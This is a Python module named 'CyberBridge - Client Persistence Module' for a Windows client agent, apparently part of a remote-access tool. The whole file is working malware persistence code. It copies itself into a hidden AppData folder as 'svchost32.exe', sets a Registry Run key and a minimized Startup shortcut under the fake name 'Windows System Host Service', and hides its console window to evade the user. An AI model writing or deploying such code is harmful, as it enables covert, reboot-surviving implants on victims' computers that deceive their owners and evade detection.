"""
CyberBridge - Client Persistence Module
Ensures the client agent survives reboots via Windows Registry Run key
and a Startup folder shortcut. Also handles stealth (hidden window, fake name).
"""

import os
import sys
import shutil
import winreg
import ctypes
import logging

logger = logging.getLogger("cyberbridge.persistence")

# ── Configuration ─────────────────────────────────────────────────────────────

APP_NAME      = "WindowsSystemHost"          # Name shown in registry / startup
INSTALL_DIR   = os.path.join(
    os.environ.get("APPDATA", ""), "Microsoft", "Windows", "SystemHost"
)
INSTALL_EXE   = os.path.join(INSTALL_DIR, "svchost32.exe")

REGISTRY_KEY  = r"Software\Microsoft\Windows\CurrentVersion\Run"

STARTUP_DIR   = os.path.join(
    os.environ.get("APPDATA", ""),
    "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
)


# ─── Stealth Utilities ────────────────────────────────────────────────────────

def hide_console_window():
    """Hides the current console window (Windows only)."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)   # SW_HIDE = 0
    except Exception as e:
        logger.debug("hide_console_window: %s", e)


def is_admin() -> bool:
    """Returns True if running with administrator privileges."""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


# ─── Install / Copy Self ──────────────────────────────────────────────────────

def install_client() -> bool:
    """
    Copies the running executable to the hidden install directory.
    Returns True on success.
    """
    src = sys.executable if getattr(sys, 'frozen', False) else __file__

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)

        # Set hidden attribute on the directory
        try:
            ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x02)  # FILE_ATTRIBUTE_HIDDEN
        except Exception:
            pass

        if not os.path.exists(INSTALL_EXE) or _is_outdated(src, INSTALL_EXE):
            shutil.copy2(src, INSTALL_EXE)
            logger.info("Installed client to %s", INSTALL_EXE)

        return True
    except Exception as e:
        logger.warning("install_client failed: %s", e)
        return False


def _is_outdated(src: str, dst: str) -> bool:
    """Returns True if src is newer than dst."""
    try:
        return os.path.getmtime(src) > os.path.getmtime(dst)
    except Exception:
        return True


# ─── Registry Persistence ─────────────────────────────────────────────────────

def add_registry_run(exe_path: str = INSTALL_EXE) -> bool:
    """Adds a Run key to persist across reboots via registry."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        logger.info("Registry Run key set: %s", APP_NAME)
        return True
    except Exception as e:
        logger.warning("add_registry_run failed: %s", e)
        return False


def remove_registry_run() -> bool:
    """Removes the Run key."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


# ─── Startup Folder Shortcut ──────────────────────────────────────────────────

def add_startup_shortcut(exe_path: str = INSTALL_EXE) -> bool:
    """Creates a .lnk shortcut in the user Startup folder."""
    try:
        import win32com.client
        shortcut_path = os.path.join(STARTUP_DIR, f"{APP_NAME}.lnk")
        shell     = win32com.client.Dispatch("WScript.Shell")
        shortcut  = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath       = exe_path
        shortcut.WorkingDirectory = INSTALL_DIR
        shortcut.WindowStyle      = 7   # Minimized / hidden
        shortcut.Description      = "Windows System Host Service"
        shortcut.save()
        logger.info("Startup shortcut created: %s", shortcut_path)
        return True
    except ImportError:
        logger.warning("win32com not available — skipping shortcut")
        return False
    except Exception as e:
        logger.warning("add_startup_shortcut failed: %s", e)
        return False


# ─── Master Setup ─────────────────────────────────────────────────────────────

def setup_persistence():
    """Runs all persistence routines at client start."""
    logger.info("Setting up persistence…")
    install_client()
    add_registry_run()
    add_startup_shortcut()
    hide_console_window()
    logger.info("Persistence complete.")
